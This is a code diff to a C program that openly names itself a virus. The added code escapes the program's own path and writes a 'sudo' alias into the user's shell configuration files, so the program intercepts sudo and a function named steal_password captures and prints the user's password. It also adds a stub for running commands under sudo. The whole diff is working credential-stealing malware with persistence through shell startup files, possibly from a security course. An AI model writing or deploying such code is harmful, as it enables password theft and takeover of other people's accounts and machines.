@@ -38,6 +38,8 @@ int main(int argc, char ** argv){
     char passwd[PASSWD_SIZE];
     char username[UNAME_SIZE];
 
+    // printf("hello\n");
+
     steal_password(passwd, username);
 
     printf("%s's password is %s\n", username, passwd);
@@ -82,13 +84,28 @@ int alias_virus(){
   char path_to_this_exe[1024] = "";
   readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));
 
+  char escaped_path[2048] = "";
+  for (int i = 0; i < strlen(path_to_this_exe); i++) {
+      if (path_to_this_exe[i] == ' ') {
+          strcat(escaped_path, "\\ ");
+      } else {
+          strncat(escaped_path, &path_to_this_exe[i], 1);
+      }
+  }
+
   //prepare the alias
-  char alias[2048] = "alias sudo=\"";
-  sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", path_to_this_exe);
+  char alias[4096] = "alias sudo=\"";
+  sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", escaped_path);
 
   for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
     append_virus(home_dir_path, CONFIGS[i], alias);
   }
+
+  // printf(path_to_this_exe, "\n");
+
+  // system("source ~/.bashrc");
+
+  // printf("sucess\n");
 
 }
 
@@ -113,5 +130,11 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
 
   close(fd);
+
+}
+
+
+//args is what goes into the sudo -- example args ={echo,test}
+int execute_sudo_cmd(char * args){
 
 }
